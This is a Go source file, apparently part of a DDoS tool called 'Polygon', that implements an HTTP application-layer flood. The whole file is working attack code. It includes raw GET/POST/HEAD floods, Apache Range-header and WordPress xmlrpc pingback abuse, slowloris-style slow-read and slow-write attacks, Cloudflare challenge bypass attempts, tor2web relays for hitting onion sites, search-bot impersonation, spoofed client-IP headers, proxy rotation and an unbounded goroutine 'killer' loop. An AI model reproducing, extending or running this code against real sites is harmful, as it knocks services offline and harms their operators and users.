package attack

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"Polygon/proxy"
	"Polygon/stats"
)

var tor2webs = []string{
	"onion.city", "onion.cab", "onion.direct", "onion.sh", "onion.link",
	"onion.ws", "onion.pet", "onion.rip", "onion.plus", "onion.top",
	"onion.si", "onion.ly", "onion.my", "onion.lu", "onion.casa",
	"onion.foundation", "onion.rodeo", "onion.lat",
	"tor2web.org", "tor2web.fi", "tor2web.blutmagie.de",
	"tor2web.to", "tor2web.io", "tor2web.in", "tor2web.it",
	"tor2web.xyz", "tor2web.su", "darknet.to",
}

var searchBots = []string{
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
	"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
}

// HTTPFlood runs an HTTP-level flood until ctx is canceled.
type HTTPFlood struct {
	TargetURL  string
	Host       string
	Method     string
	RPC        int
	UserAgents []string
	Referers   []string
	Proxies    []proxy.Proxy
	ThreadID   int
}

func (h *HTTPFlood) Run(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			h.dispatch()
		}
	}
}

// dispatch resolves the method via l7Registry (Strategy Pattern).
func (h *HTTPFlood) dispatch() {
	fn, ok := l7Registry[h.Method]
	if !ok {
		fn = (*HTTPFlood).get
	}
	fn(h)
}

func (h *HTTPFlood) ua() string {
	return h.UserAgents[rand.Intn(len(h.UserAgents))]
}

func (h *HTTPFlood) ref() string {
	return h.Referers[rand.Intn(len(h.Referers))]
}

func (h *HTTPFlood) spoofIP() string {
	ip := randIPv4()
	return fmt.Sprintf("X-Forwarded-Proto: Http\r\nX-Forwarded-Host: %s, 1.1.1.1\r\nVia: %s\r\nClient-IP: %s\r\nX-Forwarded-For: %s\r\nReal-IP: %s\r\n",
		h.Host, ip, ip, ip, ip)
}

func (h *HTTPFlood) baseHeaders() string {
	return "Accept-Encoding: gzip, deflate, br\r\n" +
		"Accept-Language: en-US,en;q=0.9\r\n" +
		"Cache-Control: max-age=0\r\n" +
		"Connection: keep-alive\r\n" +
		"Sec-Fetch-Dest: document\r\n" +
		"Sec-Fetch-Mode: navigate\r\n" +
		"Sec-Fetch-Site: none\r\n" +
		"Sec-Fetch-User: ?1\r\n" +
		"Pragma: no-cache\r\n" +
		"Upgrade-Insecure-Requests: 1\r\n"
}

func (h *HTTPFlood) parsedURL() *url.URL {
	u, _ := url.Parse(h.TargetURL)
	return u
}

func (h *HTTPFlood) openRaw() (net.Conn, error) {
	u := h.parsedURL()
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	addr := net.JoinHostPort(host, port)

	var conn net.Conn
	var err error

	if len(h.Proxies) > 0 {
		p := h.Proxies[rand.Intn(len(h.Proxies))]
		d, e := p.Dialer()
		if e != nil {
			return nil, e
		}
		conn, err = d("tcp", addr)
	} else {
		conn, err = net.DialTimeout("tcp", addr, 900*time.Millisecond)
	}
	if err != nil {
		return nil, err
	}

	if u.Scheme == "https" {
		tlsConn := tls.Client(conn, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
			MinVersion:         tls.VersionTLS12,
		})
		if err := tlsConn.Handshake(); err != nil {
			conn.Close()
			return nil, err
		}
		return tlsConn, nil
	}
	return conn, nil
}

func (h *HTTPFlood) buildRequest(method, path, extra string) string {
	httpVer := []string{"1.0", "1.1", "1.2"}[rand.Intn(3)]
	req := fmt.Sprintf("%s %s HTTP/%s\r\n", method, path, httpVer)
	req += fmt.Sprintf("Host: %s\r\n", h.Host)
	req += fmt.Sprintf("User-Agent: %s\r\n", h.ua())
	req += fmt.Sprintf("Referrer: %s%s\r\n", h.ref(), h.TargetURL)
	req += h.spoofIP()
	req += h.baseHeaders()
	if extra != "" {
		req += extra
	}
	req += "\r\n"
	return req
}

func (h *HTTPFlood) sendRaw(payload []byte, n int) {
	conn, err := h.openRaw()
	if err != nil {
		return
	}
	defer conn.Close()
	for i := 0; i < n; i++ {
		if _, err := conn.Write(payload); err != nil {
			return
		}
		stats.AddBytes(int64(len(payload)))
		stats.AddRequest(1)
	}
}

func (h *HTTPFlood) get() {
	u := h.parsedURL()
	payload := []byte(h.buildRequest("GET", u.RequestURI(), ""))
	h.sendRaw(payload, h.RPC)
}

func (h *HTTPFlood) head() {
	u := h.parsedURL()
	payload := []byte(h.buildRequest("HEAD", u.RequestURI(), ""))
	h.sendRaw(payload, h.RPC)
}

func (h *HTTPFlood) post() {
	u := h.parsedURL()
	body := randStr(32)
	extra := fmt.Sprintf("Content-Length: 44\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/json\r\n\r\n{\"data\": \"%s\"}", body) //nolint:gocritic // %q would double-quote the JSON value
	payload := []byte(h.buildRequest("POST", u.RequestURI(), extra))
	h.sendRaw(payload, h.RPC)
}

func (h *HTTPFlood) stress() {
	u := h.parsedURL()
	body := randStr(512)
	extra := fmt.Sprintf("Content-Length: 524\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/json\r\n\r\n{\"data\": \"%s\"}", body) //nolint:gocritic // %q would double-quote the JSON value
	payload := []byte(h.buildRequest("POST", u.RequestURI(), extra))
	h.sendRaw(payload, h.RPC)
}

func (h *HTTPFlood) ovh() {
	u := h.parsedURL()
	payload := []byte(h.buildRequest("GET", u.RequestURI(), ""))
	n := h.RPC
	if n > 5 {
		n = 5
	}
	h.sendRaw(payload, n)
}

func (h *HTTPFlood) cookie() {
	u := h.parsedURL()
	cookieExtra := fmt.Sprintf("Cookie: _ga=GA%d; _gat=1; __cfduid=dc232334gwdsd23434542342342342475611928; %s=%s\r\n",
		rand.Intn(99999)+1000, randStr(6), randStr(32))
	payload := []byte(h.buildRequest("GET", u.RequestURI(), cookieExtra))
	h.sendRaw(payload, h.RPC)
}

func (h *HTTPFlood) apache() {
	u := h.parsedURL()
	ranges := make([]string, 1023)
	for i := range ranges {
		ranges[i] = fmt.Sprintf("5-%d", i+1)
	}
	rangeHdr := "Range: bytes=0-," + strings.Join(ranges, ",") + "\r\n"
	payload := []byte(h.buildRequest("GET", u.RequestURI(), rangeHdr))
	h.sendRaw(payload, h.RPC)
}

func (h *HTTPFlood) xmlrpc() {
	u := h.parsedURL()
	body := fmt.Sprintf("<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>", randStr(64), randStr(64))
	extra := fmt.Sprintf("Content-Length: 345\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/xml\r\n\r\n%s", body)
	payload := []byte(h.buildRequest("POST", u.RequestURI(), extra))
	h.sendRaw(payload, h.RPC)
}

func (h *HTTPFlood) pps() {
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", h.parsedURL().RequestURI(), h.Host)
	h.sendRaw([]byte(req), h.RPC)
}

func (h *HTTPFlood) null() {
	u := h.parsedURL()
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: null\r\nReferrer: null\r\n%s\r\n",
		u.RequestURI(), h.Host, h.spoofIP())
	h.sendRaw([]byte(req), h.RPC)
}

func (h *HTTPFlood) dyn() {
	u := h.parsedURL()
	sub := randStr(6) + "." + h.Host
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferrer: %s%s\r\n%s%s\r\n",
		u.RequestURI(), sub, h.ua(), h.ref(), h.TargetURL, h.spoofIP(), h.baseHeaders())
	h.sendRaw([]byte(req), h.RPC)
}

func (h *HTTPFlood) even() {
	u := h.parsedURL()
	payload := []byte(h.buildRequest("GET", u.RequestURI(), ""))
	conn, err := h.openRaw()
	if err != nil {
		return
	}
	defer conn.Close()
	buf := make([]byte, 1)
	for {
		if _, err := conn.Write(payload); err != nil {
			return
		}
		stats.AddRequest(1)
		stats.AddBytes(int64(len(payload)))
		if _, err := conn.Read(buf); err != nil {
			return
		}
	}
}

func (h *HTTPFlood) gsb() {
	u := h.parsedURL()
	conn, err := h.openRaw()
	if err != nil {
		return
	}
	defer conn.Close()
	for i := 0; i < h.RPC; i++ {
		req := fmt.Sprintf("HEAD %s?qs=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferrer: %s%s\r\n%s%s\r\n",
			u.RequestURI(), randStr(6), h.Host, h.ua(), h.ref(), h.TargetURL, h.spoofIP(), h.baseHeaders())
		if _, err := conn.Write([]byte(req)); err != nil {
			return
		}
		stats.AddRequest(1)
		stats.AddBytes(int64(len(req)))
	}
}

func (h *HTTPFlood) bot() {
	conn, err := h.openRaw()
	if err != nil {
		return
	}
	defer conn.Close()

	bot := searchBots[rand.Intn(len(searchBots))]
	p1 := fmt.Sprintf("GET /robots.txt HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\nAccept: text/plain,text/html,*/*\r\nUser-Agent: %s\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n", h.Host, bot)
	p2 := fmt.Sprintf("GET /sitemap.xml HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\nUser-Agent: %s\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n", h.Host, bot)

	_, _ = conn.Write([]byte(p1))
	_, _ = conn.Write([]byte(p2))

	u := h.parsedURL()
	payload := []byte(h.buildRequest("GET", u.RequestURI(), ""))
	for i := 0; i < h.RPC; i++ {
		if _, err := conn.Write(payload); err != nil {
			return
		}
		stats.AddRequest(1)
		stats.AddBytes(int64(len(payload)))
	}
}

func (h *HTTPFlood) slow() {
	u := h.parsedURL()
	payload := []byte(h.buildRequest("GET", u.RequestURI(), ""))
	conn, err := h.openRaw()
	if err != nil {
		return
	}
	defer conn.Close()
	for i := 0; i < h.RPC; i++ {
		_, _ = conn.Write(payload)
		stats.AddRequest(1)
	}
	buf := make([]byte, 1)
	for {
		if _, err := conn.Write(payload); err != nil {
			return
		}
		if _, err := conn.Read(buf); err != nil {
			return
		}
		if h.RPC > 0 {
			keep := fmt.Sprintf("X-a: %d\r\n", rand.Intn(5000)+1)
			_, _ = conn.Write([]byte(keep))
			time.Sleep(time.Duration(h.RPC) * time.Millisecond * 67)
		}
	}
}

func (h *HTTPFlood) bypass() {
	var transport http.RoundTripper
	if len(h.Proxies) > 0 {
		p := h.Proxies[rand.Intn(len(h.Proxies))]
		transport = p.HTTPTransport()
	} else {
		transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
		}
	}
	client := &http.Client{Transport: transport, Timeout: 10 * time.Second}

	for range h.RPC {
		req, err := http.NewRequestWithContext(context.Background(), "GET", h.TargetURL, http.NoBody)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", h.ua())
		req.Header.Set("Referer", h.ref())
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		stats.AddRequest(1)
		resp.Body.Close()
	}
}

func (h *HTTPFlood) tor() {
	u := h.parsedURL()
	provider := "." + tor2webs[rand.Intn(len(tor2webs))]
	target := strings.ReplaceAll(u.Hostname(), ".onion", provider)
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferrer: %s%s\r\n%s%s\r\n",
		u.RequestURI(), target, h.ua(), h.ref(), h.TargetURL, h.spoofIP(), h.baseHeaders())
	h.sendRaw([]byte(req), h.RPC)
}

func (h *HTTPFlood) rhex() {
	u := h.parsedURL()
	hexLen := []int{32, 64, 128}[rand.Intn(3)]
	randhex := base64.StdEncoding.EncodeToString([]byte(randStr(hexLen)))
	req := fmt.Sprintf("GET %s/%s HTTP/1.1\r\nHost: %s/%s\r\nUser-Agent: %s\r\nReferrer: %s%s\r\n%s%s\r\n",
		u.Host, randhex, u.Host, randhex, h.ua(), h.ref(), h.TargetURL, h.spoofIP(), h.baseHeaders())
	h.sendRaw([]byte(req), h.RPC)
}

func (h *HTTPFlood) stomp() {
	u := h.parsedURL()
	hexh := strings.Repeat(`\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA`, 20)
	dep := h.baseHeaders()
	p1 := fmt.Sprintf("GET %s/%s HTTP/1.1\r\nHost: %s/%s\r\nUser-Agent: %s\r\n%s%s\r\n",
		u.Host, hexh, u.Host, hexh, h.ua(), h.spoofIP(), dep)
	p2 := fmt.Sprintf("GET %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n%s%s\r\n",
		u.Host, hexh, h.ua(), h.spoofIP(), dep)
	conn, err := h.openRaw()
	if err != nil {
		return
	}
	defer conn.Close()
	_, _ = conn.Write([]byte(p1))
	for i := 0; i < h.RPC; i++ {
		if _, err := conn.Write([]byte(p2)); err != nil {
			return
		}
		stats.AddRequest(1)
		stats.AddBytes(int64(len(p2)))
	}
}

func (h *HTTPFlood) downloader() {
	u := h.parsedURL()
	payload := []byte(h.buildRequest("GET", u.RequestURI(), ""))
	conn, err := h.openRaw()
	if err != nil {
		return
	}
	defer conn.Close()
	for i := 0; i < h.RPC; i++ {
		if _, err := conn.Write(payload); err != nil {
			return
		}
		stats.AddRequest(1)
		stats.AddBytes(int64(len(payload)))
		br := bufio.NewReader(conn)
		for {
			b, err := br.ReadByte()
			if err != nil || b == 0 {
				break
			}
			time.Sleep(10 * time.Millisecond)
		}
	}
	_, _ = conn.Write([]byte("0"))
}

func (h *HTTPFlood) killer() {
	for {
		go h.get()
	}
}
